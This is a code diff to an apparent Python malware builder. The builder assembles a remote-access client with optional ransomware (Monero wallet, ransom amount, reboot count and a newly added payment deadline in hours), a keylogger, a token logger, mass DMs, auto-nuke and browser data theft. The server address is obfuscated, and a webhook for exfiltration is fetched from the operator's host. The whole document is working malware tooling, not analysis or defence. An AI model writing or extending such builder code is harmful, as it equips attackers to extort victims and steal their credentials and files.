@@ -46,7 +46,7 @@ class Main:
             return target == 'y'
 
     def compile(self, config):
-        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
+        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
         key = {
             "SERVER_CLIENT": rat_client,
             "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
@@ -54,6 +54,7 @@ class Main:
             "KEYLOGGER": keylogger,
             "RANSOMWARE": ransomware,
             "REBOOTS_ALLOWED": reboots_allowed,
+            "HOURS": hours,
             "MONERO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
             "WEBHOOK": "'webhook'" if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
@@ -245,6 +246,7 @@ class Main:
             ransomware = config['RANSOMWARE'][0]
             if ransomware:
                 reboots_allowed = config['RANSOMWARE'][1]['REBOOTS_ALLOWED']
+                hours = config['RANSOMWARE'][1]['PAYMENT_TIMELIMIT_IN_HOURS']
                 wallet = config['RANSOMWARE'][1]['WALLET']
                 cost = config['RANSOMWARE'][1]['RANSOM_AMOUNT']
 
@@ -289,6 +291,15 @@ class Main:
                         print(color('Invalid number!', 'red'), end='\r')
                         time.sleep(1)
 
+                while True:
+                    try:
+                        print(color("Amount of time user has to send the payment (Hours): "), end="")
+                        hours = int(input("> "))
+                        break
+                    except:
+                        print(color('Invalid number!', 'red'), end='\r')
+                        time.sleep(1)
+
                 print(color("Enter your Monero Wallet: "), end="")
                 wallet = input("> ")
 
@@ -317,7 +328,7 @@ class Main:
 
         # self.server_convert = self.get_answer(color("Compile via CloudConvert? (Y or N): ")+"> ")
 
-        return rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin
+        return rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin
             
 
 if __name__ == "__main__":
